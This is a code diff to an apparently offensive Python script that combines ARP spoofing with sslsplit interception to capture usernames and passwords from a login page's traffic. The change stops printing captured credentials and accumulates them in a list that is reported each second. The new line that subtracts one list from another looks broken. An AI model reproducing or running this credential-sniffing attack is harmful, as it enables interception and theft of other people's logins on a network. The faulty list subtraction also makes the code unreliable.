@@ -83,9 +83,14 @@ if __name__ == "__main__":
     sslsplit()
 
     sending_flag = True
+
+    preans = []
+    ans = []
+
     try:
         while(1):
             # send arp relies spoofing
+            
             for j in range(0,len(ip)):
                 if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
                     victimpacket = ARP( op      =  2,
@@ -115,8 +120,14 @@ if __name__ == "__main__":
                             # print(type(line), line)
                             if(re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line) != []):
                                 (username, passwd) = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line)[0]
-                                print("username: ", unquote(username)," password: ",  unquote(passwd))
+                                # print("username: ", unquote(username)," password: ",  unquote(passwd))
+                                ans.append((username,passwd))
             sending_flag = False
+
+            print(ans-preans)
+
+            preans = ans.copy()
+            ans = []
             sleep(1)
     finally:
         print("done")
